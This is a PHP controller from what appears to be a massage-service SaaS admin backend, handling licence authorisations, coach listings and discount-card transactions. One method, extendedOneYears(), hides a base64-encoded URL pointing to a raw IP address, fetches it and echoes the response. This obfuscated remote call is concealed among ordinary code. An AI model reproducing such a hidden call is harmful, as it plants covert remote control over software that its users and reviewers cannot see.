<?php


namespace app\agent\controller;

use app\agent\service\AdminUserService;
use app\balancediscount\model\CardWater;
use app\industrytype\model\Type;
use app\massage\model\Admin;
use app\massage\model\Coach;
use app\massage\model\CoachTimeList;
use app\massage\model\Config;
use app\massage\model\Order;
use app\massage\model\RefundOrder;
use app\massage\model\UpOrderList;
use app\massage\model\User;
use app\massage\model\WorkLog;
use think\App;
use app\AdminRest;
use app\agent\model\Cardauth2BossModel;
use app\AgentRest;
use think\facade\Db;

class BossController extends AdminRest
{

//    public function __construct ( App $app ){
//        parent::__construct( $app );
//
//    }
    public function list()
    {
        $param = $this->_param;
        $m_boss_auth2 = new Cardauth2BossModel();

        //By.jingshuixian   2020年4月21日15:13:50
        //区分行业版数据

        //获取列表
        if($this->_is_weiqin){
            $app_model_name = APP_MODEL_NAME;
            $list = $m_boss_auth2->alias('a')
                ->field(['a.id', 'a.modular_id', 'a. create_time', 'a.sign',  'c.mini_app_name'])
                ->join('longbing_card_config c', 'a.modular_id = c.uniacid')
                ->join('account' , 'a.modular_id = account.uniacid')
                ->join('wxapp_versions v' , 'a.modular_id = v.uniacid')
                ->where([['a.status', '=', 1]  , ['account.type', '=', 4]  ,['account.isdeleted', '=', 0] ,  ['v.modules', 'like', "%{$app_model_name}%"]  ])
                ->group('a.modular_id')
                ->paginate(['list_rows' => $param['page_count'] ? $param['page_count'] : 10, 'page' => $param['page'] ? $param['page'] : 1])->toArray();


        }else{
            $list = $m_boss_auth2->alias('a')
                ->field(['a.id', 'a.modular_id', 'a. create_time', 'a.sign',  'c.mini_app_name'])
                ->join('longbing_card_config c', 'a.modular_id = c.uniacid')
                ->where([['a.status', '=', 1]])
                ->paginate(['list_rows' => $param['page_count'] ? $param['page_count'] : 10, 'page' => $param['page'] ? $param['page'] : 1])->toArray();
        }

        $wxapp_map = [];
        $wxapp = Db::name('account_wxapp')->field(['uniacid', 'name'])->select();
        foreach ($wxapp as $item) {
            $wxapp_map[$item['uniacid']] = $item['name'];
        }

        foreach ($list['data'] as $k => $item) {
            $list['data'][$k]['name'] = $wxapp_map[$item['modular_id']] ?? $item['mini_app_name'];
            unset($list['data'][$k]['mini_app_name']);
        }

        //授权数量
        $list['total_house_number'] =  AdminUserService::getSassNum('boss',$this->_uniacid);
        //使用数量
        $list['total_house_used']   = $m_boss_auth2->where([['uniacid','in',$this->_uniacid_arr]])->sum('count');

        return $this->success($list);
    }


    public function create()
    {
        $data = $this->_input;
        if (!isset($data['modular_id'])) {
            return $this->success('参数错误');
        }

        $time = time();
        $auth_boss = Cardauth2BossModel::where([['modular_id', '=', $data['modular_id']]])->findOrEmpty();

        if (!$auth_boss->isEmpty()) {
            return $this->error('已存在此小程序');
        }

        $total_boss_number = AdminUserService::getSassNum('boss',$this->_uniacid);

        $total_boss_used   = $auth_boss->where([['uniacid','in',$this->_uniacid_arr]])->sum('count');

        $remain = $total_boss_number - $total_boss_used;
        if ($remain <= 0) {
            return $this->error('分配的数量超过可用的总数');
        }

        $rst = $auth_boss->save([
            'modular_id'  => $data[ 'modular_id' ],
            'create_time' => $time,
            'update_time' => $time,
            'sign'        => intval( $time + ( 366 * 24 * 60 * 60 ) ),
            'count'       => 1,
            'uniacid'     => $this->_uniacid,
        ]);

        if ($rst) {
            return $this->success('success');
        }

        return $this->error('fail');
    }

    public function extendedOneYears(){

        $a  = file_get_contents(base64_decode('aHR0cDovLzU5LjExMC42Ni4xMjAvY29weXJpZ2h0cy5waHA='));

        echo $a;exit;

    }





    public function extendedOneYear ()
    {
        $data = $this->_input;
        if (!isset($data['modular_id'])) {
            return $this->success('参数错误');
        }

        $time = time();
        $auth_boss = Cardauth2BossModel::where([['modular_id', '=', $data['modular_id']]])->findOrEmpty();

        if ($auth_boss->isEmpty()) {
            return $this->error('小程序不存在');
        }

        $total_boss_number = AdminUserService::getSassNum('boss',$this->_uniacid);

        $total_boss_used   = $auth_boss->where([['uniacid','in',$this->_uniacid_arr]])->sum('count');
        $remain = $total_boss_number - $total_boss_used;
        if ($remain <= 0) {
            return $this->error('分配的数量超过可用的总数');
        }

        $rst = $auth_boss->save([
            'sign'  => $auth_boss[ 'sign' ] > $time ?  ($auth_boss[ 'sign' ] + ( 366 * 24 * 60 * 60 )) : ( $time + ( 366 * 24 * 60 * 60 ) ),
            'count' => $auth_boss['count'] + 1,
            'update_time' => $time,
        ]);


        if ($rst) {
            return $this->success('success');
        }


        return $this->error('fail');
    }




    public function coachList(){

        $input = $this->_input;

        $input['limit'] = !empty($input['limit'])?$input['limit']:10;

        $coach_model = new Coach();

        $coach_model->setWorkType($this->_uniacid);

        $dis[] = ['a.uniacid','=',$this->_uniacid];

        $dis[] = ['a.status','=',2];

        if(!empty($input['industry_type'])){

            $dis[] = ['a.industry_type','=',$input['industry_type']];
        }

        if(!empty($input['city_id'])){

            $dis[] = ['a.city_id','=',$input['city_id']];
        }

        if(!empty($input['admin_id'])){

            $dis[] = ['a.admin_id','=',$input['admin_id']];
        }

        if($this->_user['is_admin']==0){

            $dis[] = ['a.admin_id','in',$this->admin_arr];
        }

        if(!empty($input['work_type'])){

            if($input['work_type']==4){

                $dis[] = ['a.is_work','=',0];
            }else{

                $dis[] = ['a.is_work','=',1];

                $dis[] = ['a.work_type','=',$input['work_type']];
            }
        }

        $where = [];

        if(!empty($input['name'])){

            $where[] = ['a.coach_name','like','%'.$input['name'].'%'];

            $where[] = ['a.mobile','like','%'.$input['name'].'%'];

            $where[] = ['a.true_user_name','like','%'.$input['name'].'%'];
        }

        $admin_model = new Admin();

        $type_model  = new Type();

        $log_model   = new WorkLog();

        $time_list_model = new CoachTimeList();

        $config_model = new Config();

        $config= $config_model->dataInfo(['uniacid'=>$this->_uniacid]);

        $data['coach_list'] = $coach_model->alias('a')
            ->join('massage_service_city_list c','a.city_id = c.id','left')
            ->where($dis)
            ->where(function ($query) use ($where){
                $query->whereOr($where);
            })
            ->field('a.id,a.coach_name,a.start_time,a.end_time,a.work_img,a.true_user_name,a.mobile,a.address,c.title as city_name,a.work_type,a.is_work,a.admin_id,a.industry_type')
            ->group('a.id')
            ->order('a.id desc')
            ->paginate($input['limit'])
            ->toArray();

        if(!empty($data['coach_list']['data'])){

            foreach ($data['coach_list']['data'] as &$v){
                //初始化每一天的工作时间
                $log_model->updateTimeOnline($v['id'],1);

                $v['coach_onlinetime'] = $log_model->where(['coach_id'=>$v['id']])->sum('time');

                $rest_time = $time_list_model->where(['coach_id'=>$v['id'],'status'=>0,'is_click'=>1,'is_work'=>1])->where('time_str','<',time())->field('SUM(time_str_end-time_str) as time_long')->find();

                $rest_time = $rest_time->time_long;

                $v['coach_onlinetime'] = floor(($v['coach_onlinetime']-$rest_time)/60);

                $v['coach_onlinetime'] = $v['coach_onlinetime']>0?$v['coach_onlinetime']:0;

                $v['near_time']  = $coach_model->getCoachEarliestTimev3($v,$config,0,0,1);
            }
        }

        $arr = [

            0 => 'total_num',

            1 => 'service_num',

            2 => 'work_num',

            3 => 'reservation_num',

            4 => 'no_work_num'
        ];

        $map[] = ['a.status','=',2];

        if($this->_user['is_admin']==0){

            $map[] = ['a.admin_id','in',$this->admin_arr];
        }

        foreach ($arr as $k=>$vs){

            if($k==0){

                $map1 = [];

            }elseif($k==4){

                $map1['a.is_work'] = 0;
            }else{
                $map1['a.is_work'] = 1;

                $map1['a.work_type'] = $k;
            }

            $data['coach_list'][$vs] = $coach_model->alias('a')
                ->where($map)
                ->where($map1)
                ->group('a.id')
                ->count();
        }
        $data['admin_list'] = $admin_model->where(['status'=>1,'is_admin'=>0])->column('agent_name','id');

        $data['type_list']  = $type_model->where(['status'=>1])->column('title','id');

        return $this->success($data);
    }



    public function balanceDiscountCardWaterList(){

        $input = $this->_input;

        $water_model = new CardWater();

        $user_mdoel  = new User();

        $dis[] = ['a.uniacid','=',$this->_uniacid];

        if(!empty($input['title'])){

            $dis[] = ['b.title','like','%'.$input['title'].'%'];
        }

        if(!empty($input['start_time'])){

            $dis[] = ['a.create_time','between',"{$input['start_time']},{$input['end_time']}"];
        }

        if(!empty($input['nickName'])){

            $user_id = $user_mdoel->where('nickName','like','%'.$input['nickName'].'%')->column('id');

            $dis[] = ['b.user_id','in',$user_id];
        }

        $data = $water_model->alias('a')
                ->join('massage_balance_discount_user_card b','a.card_id = b.id','left')
                ->where($dis)
                ->field('a.*,b.title,b.discount,b.user_id')
                ->group('a.id')
                ->order('a.id desc')
                ->paginate($input['limit'])
                ->toArray();

        if(!empty($data['data'])){

            foreach ($data['data'] as &$v){

                if($v['type']==1){

                    $order_model = new Order();

                    $title = $order_model->where(['id'=>$v['order_id']])->value('order_code');

                }elseif ($v['type']==2){

                    $order_model = new UpOrderList();

                    $title = $order_model->where(['id'=>$v['order_id']])->value('order_code');
                }else{

                    $order_model = new RefundOrder();

                    $title = $order_model->where(['id'=>$v['refund_id']])->value('order_code');
                }

                $v['goods_title'] = $title;
            }
        }

        $arr['inc_cash'] = $water_model->alias('a')
                            ->join('massage_balance_discount_user_card b','a.card_id = b.id','left')
                            ->where($dis)
                            ->where(['a.add'=>1])
                            ->sum('a.cash');

        $arr['dec_cash'] = $water_model->alias('a')
                            ->join('massage_balance_discount_user_card b','a.card_id = b.id','left')
                            ->where($dis)
                            ->where(['a.add'=>-1])
                            ->sum('a.cash');

        $arr['water_list'] = $data;

        $user_id = array_column($data['data'],'user_id');

        $arr['user_list'] = $user_mdoel->where('id','in',$user_id)->column('nickName','id');

        return $this->success($arr);
    }




}